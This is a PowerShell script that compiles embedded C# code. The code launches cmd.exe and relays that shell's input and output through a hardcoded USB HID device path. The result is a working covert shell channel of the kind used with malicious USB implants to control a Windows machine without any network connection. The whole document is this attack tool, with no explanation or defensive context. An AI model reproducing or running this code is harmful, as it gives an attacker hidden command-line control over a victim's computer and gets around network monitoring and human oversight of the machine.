$source=@"
using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace GenericHid
{
class pipe
{
private Stream r, w;
bool x;
public static volatile bool y = true;
public pipe(Stream rr, Stream ww, bool xx)
{
r = rr;
w = ww;
x = xx;
}

public void connect()
{
int read;
Byte[] b = new Byte[9];
try
{
while (y)
{
read = x ? r.Read(b, 0, 9) : r.Read(b, 2, 7);
if (read > 0)
{
if (x)
{
if (b[1] > 0 && b[1] < 8)
{
w.Write(b, 2, b[1]);
w.Flush();
Thread.Sleep(1);
}
}
else
{
b[1] = (byte)read;
lock(w)
{
w.Write(b, 0, 9);
}
}
}
}
} catch (Exception e)
{
Console.WriteLine("Exception");
Console.WriteLine(e.StackTrace.ToString());
y = false;
return;
}
}
}

public class cmdline
{
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
internal static extern SafeFileHandle CreateFile(String lpFileName, UInt32 dwDesiredAccess, Int32 dwShareMode, IntPtr lpSecurityAttributes, Int32 dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

public static void Main()
{
string fn = @"\\?\hid#vid_03eb&pid_2066&mi_01#9&13294738&0&0000#{4d1e55b2-f16f-11cf-88cb-001111000030}";
ProcessStartInfo psi = new ProcessStartInfo();
psi.CreateNoWindow = false;
psi.UseShellExecute = false;
psi.RedirectStandardInput = true;
psi.RedirectStandardOutput = true;
psi.RedirectStandardError = true;
psi.FileName = "cmd.exe";

Process p = new Process();
p.StartInfo = psi;
p.Start();

new cmdline().openAndPipe(fn, p.StandardInput.BaseStream, p.StandardOutput.BaseStream, p.StandardError.BaseStream);
p.WaitForExit();
p.StandardInput.Close();
p.StandardOutput.Close();
p.StandardError.Close();
}

public void openAndPipe(string fn, Stream i, Stream o, Stream e)
{
SafeFileHandle h = CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0, IntPtr.Zero);
if (h.IsInvalid)
{
Console.WriteLine("Invalid handle");
return;
}
Stream d = new FileStream(h, FileAccess.ReadWrite, 9, false);
new Thread(new pipe(o, d, false).connect).Start();
new Thread(new pipe(e, d, false).connect).Start();
new Thread(new pipe(d, i, true).connect).Start();
}
}
}
"@
Add-Type -TypeDefinition $source
[GenericHid.cmdline]::Main()


